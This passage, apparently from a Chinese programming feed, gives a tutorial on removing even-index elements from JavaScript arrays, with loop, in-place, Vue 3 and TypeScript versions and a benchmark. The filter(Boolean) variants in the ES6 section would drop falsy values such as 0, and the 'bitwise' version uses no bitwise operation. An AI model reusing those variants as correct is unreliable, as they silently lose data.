<li><strong>使用 for 循环创建新数组</strong></li>
</ol>
<pre><code class="hljs language-ini" lang="ini">// 方法4: 遍历奇数下标创建新数组
const <span class="hljs-attr">arr</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]<span class="hljs-comment">;</span>

function removeEvenIndexes(arr) {
  const <span class="hljs-attr">result</span> = []<span class="hljs-comment">;</span>
  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; arr.length; i++) {</span>
    if (i % 2 !== 0) {  // 只取奇数下标
      result.push(arr<span class="hljs-section">[i]</span>)<span class="hljs-comment">;</span>
    }
  }
  return result<span class="hljs-comment">;</span>
}

console.log(removeEvenIndexes(arr))<span class="hljs-comment">; // [1, 3, 5, 7, 9]</span>

</code></pre>
<ol start="5">
<li><strong>while 循环 + splice</strong></li>
</ol>
<pre><code class="hljs language-ini" lang="ini">// 方法5: 使用while循环
const <span class="hljs-attr">arr</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]<span class="hljs-comment">;</span>

function removeEvenIndexes(arr) {
  let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
  while (i &lt; arr.length) {
    if (i % <span class="hljs-attr">2</span> === <span class="hljs-number">0</span>) {  // 删除偶数下标
      arr.splice(i, 1)<span class="hljs-comment">;</span>
    } else {
      i++<span class="hljs-comment">;  // 只有不删除时才递增</span>
    }
  }
  return arr<span class="hljs-comment">;</span>
}

console.log(removeEvenIndexes(arr))<span class="hljs-comment">; // [1, 3, 5, 7, 9]</span>
</code></pre>
<ol start="6">
<li><strong>性能优化版本（大数据量）</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 方法6: 高性能版本，避免splice</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">removeEvenIndexesOptimized</span>(<span class="hljs-params">arr</span>) {
  <span class="hljs-keyword">const</span> result = [];
  <span class="hljs-keyword">const</span> length = arr.<span class="hljs-property">length</span>;
  
  <span class="hljs-comment">// 从第一个奇数下标开始，步长为2</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; length; i += <span class="hljs-number">2</span>) {
    result.<span class="hljs-title function_">push</span>(arr[i]);
  }
  
  <span class="hljs-keyword">return</span> result;
}

<span class="hljs-comment">// 测试大数据量</span>
<span class="hljs-keyword">const</span> largeArr = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'优化版'</span>);
<span class="hljs-keyword">const</span> optimizedResult = <span class="hljs-title function_">removeEvenIndexesOptimized</span>(largeArr);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'优化版'</span>); <span class="hljs-comment">// 大约 5-10ms</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'结果长度:'</span>, optimizedResult.<span class="hljs-property">length</span>); <span class="hljs-comment">// 500000</span>
</code></pre>
<ol start="7">
<li><strong>原地修改的高效方法</strong></li>
</ol>
<pre><code class="hljs language-//" lang="//">function removeEvenIndexesInPlace(arr) {
  let writeIndex = 0;
  
  for (let readIndex = 0; readIndex &lt; arr.length; readIndex++) {
    if (readIndex % 2 !== 0) {  // 只保留奇数下标
      arr[writeIndex] = arr[readIndex];
      writeIndex++;
    }
  }
  
  // 截断数组
  arr.length = writeIndex;
  return arr;
}

const arr = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
console.log(removeEvenIndexesInPlace(arr)); // [1, 3, 5, 7, 9]
console.log(arr); // 原数组被修改

</code></pre>
<ol start="8">
<li><strong>Vue 3 响应式数组处理</strong></li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>原始数组: {{ originalArray }}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>处理后: {{ processedArray }}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"processArray"</span>&gt;</span>删除偶数下标<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"resetArray"</span>&gt;</span>重置数组<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 原始响应式数组</span>
<span class="hljs-keyword">const</span> originalArray = <span class="hljs-title function_">ref</span>([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>])

<span class="hljs-comment">// 计算属性：删除偶数下标</span>
<span class="hljs-keyword">const</span> processedArray = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> originalArray.<span class="hljs-property">value</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> index % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>)
})

<span class="hljs-comment">// 方法处理</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">processArray</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 方法1: 创建新数组（推荐，不修改原数组）</span>
  originalArray.<span class="hljs-property">value</span> = originalArray.<span class="hljs-property">value</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> index % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>)
  
  <span class="hljs-comment">// 方法2: 原地修改（会触发响应式更新）</span>
  <span class="hljs-comment">// let writeIndex = 0</span>
  <span class="hljs-comment">// for (let i = 0; i &lt; originalArray.value.length; i++) {</span>
  <span class="hljs-comment">//   if (i % 2 !== 0) {</span>
  <span class="hljs-comment">//     originalArray.value[writeIndex] = originalArray.value[i]</span>
  <span class="hljs-comment">//     writeIndex++</span>
  <span class="hljs-comment">//   }</span>
  <span class="hljs-comment">// }</span>
  <span class="hljs-comment">// originalArray.value.length = writeIndex</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">resetArray</span> = (<span class="hljs-params"/>) =&gt; {
  originalArray.<span class="hljs-property">value</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<ol start="9">
<li><strong>通用工具函数</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 工具函数集合</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ArrayUtils</span> = {
  <span class="hljs-comment">/**
   * 删除偶数下标元素
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Array</span>} <span class="hljs-variable">arr</span> - 输入数组
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">boolean</span>} <span class="hljs-variable">inPlace</span> - 是否原地修改
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Array</span>} 处理后的数组
   */</span>
  <span class="hljs-attr">removeEvenIndexes</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr, inPlace = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(arr)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'输入必须是数组'</span>)
    }
    
    <span class="hljs-keyword">if</span> (inPlace) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_removeEvenIndexesInPlace</span>(arr)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_removeEvenIndexesNew</span>(arr)
    }
  },
  
  <span class="hljs-comment">/**
   * 创建新数组（不修改原数组）
   */</span>
  <span class="hljs-attr">_removeEvenIndexesNew</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) {
    <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> index % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>)
  },
  
  <span class="hljs-comment">/**
   * 原地修改
   */</span>
  <span class="hljs-attr">_removeEvenIndexesInPlace</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) {
    <span class="hljs-keyword">let</span> writeIndex = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>) {
        arr[writeIndex] = arr[i]
        writeIndex++
      }
    }
    arr.<span class="hljs-property">length</span> = writeIndex
    <span class="hljs-keyword">return</span> arr
  },
  
  <span class="hljs-comment">/**
   * 删除奇数下标元素
   */</span>
  <span class="hljs-attr">removeOddIndexes</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr, inPlace = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (inPlace) {
      <span class="hljs-keyword">let</span> writeIndex = <span class="hljs-number">0</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
          arr[writeIndex] = arr[i]
          writeIndex++
        }
      }
      arr.<span class="hljs-property">length</span> = writeIndex
      <span class="hljs-keyword">return</span> arr
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> index % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>)
    }
  },
  
  <span class="hljs-comment">/**
   * 删除指定下标的元素
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Array</span>} <span class="hljs-variable">arr</span> - 输入数组
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Function</span>} <span class="hljs-variable">condition</span> - 条件函数，返回true则删除
   */</span>
  <span class="hljs-attr">removeByIndexCondition</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr, condition, inPlace = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (inPlace) {
      <span class="hljs-keyword">let</span> writeIndex = <span class="hljs-number">0</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">condition</span>(i)) {
          arr[writeIndex] = arr[i]
          writeIndex++
        }
      }
      arr.<span class="hljs-property">length</span> = writeIndex
      <span class="hljs-keyword">return</span> arr
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> !<span class="hljs-title function_">condition</span>(index))
    }
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]

<span class="hljs-comment">// 删除偶数下标</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">ArrayUtils</span>.<span class="hljs-title function_">removeEvenIndexes</span>(arr)) <span class="hljs-comment">// [1, 3, 5, 7, 9]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr) <span class="hljs-comment">// 原数组不变 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span>

<span class="hljs-comment">// 原地修改</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">ArrayUtils</span>.<span class="hljs-title function_">removeEvenIndexes</span>(arr, <span class="hljs-literal">true</span>)) <span class="hljs-comment">// [1, 3, 5, 7, 9]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr) <span class="hljs-comment">// 原数组被修改 [1, 3, 5, 7, 9]</span>

<span class="hljs-comment">// 删除奇数下标</span>
<span class="hljs-keyword">const</span> arr2 = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">ArrayUtils</span>.<span class="hljs-title function_">removeOddIndexes</span>(arr2)) <span class="hljs-comment">// [0, 2, 4, 6, 8]</span>

<span class="hljs-comment">// 自定义条件</span>
<span class="hljs-keyword">const</span> arr3 = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">ArrayUtils</span>.<span class="hljs-title function_">removeByIndexCondition</span>(
  arr3, 
  <span class="hljs-function"><span class="hljs-params">index</span> =&gt;</span> index % <span class="hljs-number">3</span> === <span class="hljs-number">0</span>
)) <span class="hljs-comment">// 删除下标是3的倍数的元素</span>
</code></pre>
<ol start="10">
<li><strong>ES6+ 高级写法</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用生成器函数</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">filterByIndex</span>(<span class="hljs-params">arr, condition</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">condition</span>(i)) {
      <span class="hljs-keyword">yield</span> arr[i]
    }
  }
}

<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]
<span class="hljs-keyword">const</span> result = [...<span class="hljs-title function_">filterByIndex</span>(arr, <span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>)]
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result) <span class="hljs-comment">// [1, 3, 5, 7, 9]</span>

<span class="hljs-comment">// 使用箭头函数和三元运算符</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">removeEvenIndexes</span> = arr =&gt; arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i % <span class="hljs-number">2</span> ? arr[i] : <span class="hljs-literal">null</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>)

<span class="hljs-comment">// 使用位运算（性能更好）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">removeEvenIndexesBit</span> = arr =&gt; {
  <span class="hljs-keyword">const</span> result = []
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; arr.<span class="hljs-property">length</span>; i += <span class="hljs-number">2</span>) {
    result.<span class="hljs-title function_">push</span>(arr[i])
  }
  <span class="hljs-keyword">return</span> result
}

<span class="hljs-comment">// 使用 Array.from</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">removeEvenIndexesFrom</span> = arr =&gt; 
  <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(
    { <span class="hljs-attr">length</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(arr.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>) },
    <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> arr[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>]
  ).<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>)

</code></pre>
<ol start="11">
<li><strong>TypeScript 版本</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScript 类型安全的版本</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayProcessor</span> {
  <span class="hljs-comment">/**
   * 删除偶数下标元素
   * <span class="hljs-doctag">@param</span> arr 输入数组
   * <span class="hljs-doctag">@param</span> inPlace 是否原地修改
   * <span class="hljs-doctag">@returns</span> 处理后的数组
   */</span>
  <span class="hljs-keyword">static</span> removeEvenIndexes&lt;T&gt;(<span class="hljs-attr">arr</span>: T[], <span class="hljs-attr">inPlace</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>): T[] {
    <span class="hljs-keyword">if</span> (inPlace) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeEvenIndexesInPlace</span>(arr)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeEvenIndexesNew</span>(arr)
    }
  }
  
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> removeEvenIndexesNew&lt;T&gt;(<span class="hljs-attr">arr</span>: T[]): T[] {
    <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> index % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>)
  }
  
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> removeEvenIndexesInPlace&lt;T&gt;(<span class="hljs-attr">arr</span>: T[]): T[] {
    <span class="hljs-keyword">let</span> writeIndex = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>) {
        arr[writeIndex] = arr[i]
        writeIndex++
      }
    }
    arr.<span class="hljs-property">length</span> = writeIndex
    <span class="hljs-keyword">return</span> arr
  }
  
  <span class="hljs-comment">/**
   * 泛型方法：根据下标条件过滤数组
   */</span>
  <span class="hljs-keyword">static</span> filterByIndex&lt;T&gt;(
    <span class="hljs-attr">arr</span>: T[], 
    <span class="hljs-attr">predicate</span>: <span class="hljs-function">(<span class="hljs-params">index: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">boolean</span>
  ): T[] {
    <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> <span class="hljs-title function_">predicate</span>(index))
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">numbers</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]
<span class="hljs-keyword">const</span> <span class="hljs-attr">strings</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>]

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">ArrayProcessor</span>.<span class="hljs-title function_">removeEvenIndexes</span>(numbers)) <span class="hljs-comment">// [1, 3, 5, 7, 9]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">ArrayProcessor</span>.<span class="hljs-title function_">filterByIndex</span>(strings, <span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>)) <span class="hljs-comment">// ['a', 'c', 'e']</span>
</code></pre>
<ol start="11">
<li><strong>性能对比测试</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 性能测试</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">testPerformance</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> largeArray = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i)
  
  <span class="hljs-comment">// 测试 filter 方法</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'filter'</span>)
  <span class="hljs-keyword">const</span> result1 = largeArray.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'filter'</span>)
  
  <span class="hljs-comment">// 测试 for 循环</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'for loop'</span>)
  <span class="hljs-keyword">const</span> result2 = []
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; largeArray.<span class="hljs-property">length</span>; i += <span class="hljs-number">2</span>) {
    result2.<span class="hljs-title function_">push</span>(largeArray[i])
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'for loop'</span>)
  
  <span class="hljs-comment">// 测试 while 循环</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'while loop'</span>)
  <span class="hljs-keyword">const</span> arrCopy = [...largeArray]
  <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>
  <span class="hljs-keyword">while</span> (i &lt; arrCopy.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
      arrCopy.<span class="hljs-title function_">splice</span>(i, <span class="hljs-number">1</span>)
    } <span class="hljs-keyword">else</span> {
      i++
    }
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'while loop'</span>)
  
  <span class="hljs-comment">// 测试 reduce</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'reduce'</span>)
  <span class="hljs-keyword">const</span> result4 = largeArray.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, cur, i</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>) acc.<span class="hljs-title function_">push</span>(cur)
    <span class="hljs-keyword">return</span> acc
  }, [])
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'reduce'</span>)
}

<span class="hljs-title function_">testPerformance</span>()
<span class="hljs-comment">// 结果通常: for loop 最快, filter 次之, reduce 较慢, while+splice 最慢</span>

</code></pre>
<h2 data-id="heading-1">总结</h2>
<h3 data-id="heading-2">推荐方法：</h3>
<ol>
<li>
<p><strong>最简洁</strong>：<code>filter</code>方法</p>
<pre><code class="hljs language-css" lang="css">arr<span class="hljs-selector-class">.filter</span>((_, <span class="hljs-selector-tag">i</span>) =&gt; <span class="hljs-selector-tag">i</span> % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>)
</code></pre>
</li>
<li>
<p><strong>最高性能</strong>：<code>for</code>循环</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">result</span> = []
for (let <span class="hljs-attr">i</span> = <span class="hljs-number">1</span><span class="hljs-comment">; i &lt; arr.length; i += 2) {</span>
  result.push(arr<span class="hljs-section">[i]</span>)
}
</code></pre>
</li>
<li>
<p><strong>原地修改</strong>：使用写指针</p>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">writeIndex</span> = <span class="hljs-number">0</span>
for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; arr.length; i++) {</span>
  if (i % 2 !== 0) {
    arr<span class="hljs-section">[writeIndex]</span> = arr<span class="hljs-section">[i]</span>
    writeIndex++
  }
}
<span class="hljs-attr">arr.length</span> = writeIndex
</code></pre>
</li>
</ol>
<h3 data-id="heading-3">注意事项：</h3>
<ol>
<li><strong>索引从0开始</strong>：JavaScript 数组下标从0开始</li>
<li><strong>避免splice</strong>：在循环中使用 <code>splice</code>会改变数组长度，容易出错</li>
<li><strong>性能考虑</strong>：大数据量时避免使用 <code>splice</code>和 <code>filter</code>链式调用</li>
<li><strong>不变性</strong>：根据需求选择是否修改原数组</li>
</ol>
<h3 data-id="heading-4">扩展应用：</h3>
<ul>
<li>删除奇数下标：<code>i % 2 === 0</code></li>
<li>删除特定模式：<code>i % 3 === 0</code>删除3的倍数下标</li>
<li>保留特定范围：<code>i &gt;= 2 &amp;&amp; i &lt;= 5</code></li>
</ul>
<p>**</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ESM vs CJS 模块化差异对比]]></title>    <link>https://juejin.cn/post/7591942733365461026</link>    <guid>https://juejin.cn/post/7591942733365461026</guid>    <pubDate>2026-01-06T07:32:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591942733365461026" data-draft-id="7591780560487874560" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ESM vs CJS 模块化差异对比"/> <meta itemprop="keywords" content="JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-06T07:32:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Dr_哈哈"/> <meta itemprop="url" content="https://juejin.cn/user/2208293602984286"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ESM vs CJS 模块化差异对比
